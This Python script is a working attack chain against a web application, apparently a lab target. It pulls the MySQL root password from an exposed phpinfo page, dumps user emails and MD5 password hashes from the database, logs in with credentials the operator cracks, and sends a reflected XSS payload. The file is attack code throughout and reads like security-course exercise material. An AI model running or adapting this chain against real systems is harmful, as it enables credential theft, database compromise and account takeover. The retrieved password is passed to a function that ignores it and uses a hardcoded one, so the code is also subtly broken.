#!/usr/bin/python

import requests;
from requests.models import Response;
import os;
from termcolor import cprint;
import json;
import re;
import urllib.parse;
import mysql.connector;

request = requests.session();
headers_data2= {
'Host': 'pravin.itechers.net',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
'Accept': 'image/webp,*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Referer': 'http://pravin.itechers.net/'
}

login_url = "http://pravin.itechers.net/login.php";
headers_data = {
'Host': 'pravin.itechers.net',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '48',
'Origin': 'http://pravin.itechers.net',
'Connection': 'close',
'Referer': 'http://pravin.itechers.net/login.php',
'Upgrade-Insecure-Requests': '1'
};

credentials = { 'email': 'user1@test.com',
                'password': 'password',
                'submit': '' };


def user_details():
  mydb = mysql.connector.connect(
          host="pravin.itechers.net",
          user="root",
          password="definitely_insecure",
          database="itecher"
        )

  mycursor = mydb.cursor()
  mycursor.execute("select email,password from itecher.users");
  myresult = mycursor.fetchall();
  cprint("==================================================================","blue")
  for x in myresult:
    print(x)
  cprint("==================================================================","blue");

def open_phpinfo():
  cprint("[+] Navigating to the phpinfo file","green");
  res = request.get('http://pravin.itechers.net/phpinfo.php', headers= headers_data2);
  response = str(res.text);
  extract = re.findall(r"\['MYSQL_ROOT_PASSWORD'\]<\/td><td class=\"v\">[a-z_]*",response)
  search = extract[0];
  database_pass = search[-19:];
  cprint(f"[+] Database password \"{database_pass}\" successfully retrieved from the file", "yellow");
  login_database(database_pass);

def login_database(passwd):
  cprint("[+] Login to the database and retrieve the credentials","green");
  cprint("[+] User credentails:","yellow");
  user_details();
  cprint("[+] Please crack md5 password on your own since it takes lot of memory to run hashcat in the linux machine","red");
  login_username=input("Enter username:")
  login_pass = input("Enter password:");
  login_application(login_username,login_pass);

def login_application(username, password):
  response= request.get(login_url, headers=headers_data, allow_redirects=True);
  res_headers = str(response.headers);
  find = (re.findall(r"PHPSESSID=[a-zA-Z0-9]*", res_headers));

  headers_data1 = {
        'Host': 'pravin.itechers.net',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '48',
        'Origin': 'http://pravin.itechers.net',
        'Connection': 'close',
        'Referer': 'http://pravin.itechers.net/login.php',
        'Cookie': find[0],
        'Upgrade-Insecure-Requests': '1'
        };

  credentials = { 'email': username,
                'password': password,
                'submit': '' };
  response1 = request.post(login_url, data= credentials, headers= headers_data1);

  response2 = request.get('http://pravin.itechers.net/index.php', headers= headers_data);
  
  if response2.text.find("Welcome Home") != -1:
    cprint("[+] Successfully logged in", "green");
    reflected_xss();
  else:
    cprint("[-] Login is not successful", "red"); 
    exit;

def reflected_xss():
  ref_url = "http://pravin.itechers.net/news-read.php?slug="
  xss_payload = "<script>alert(1)</script>"
  res = request.get(ref_url+xss_payload, headers= headers_data, allow_redirects=True);
  if res.status_code ==200 and res.text.find(xss_payload) !=-1:
    cprint("[+] Reflected XSS attack is successfull", "green");
  else:
    cprint("[-] Reflected xss attack is not succesfull", "red");


open_phpinfo();
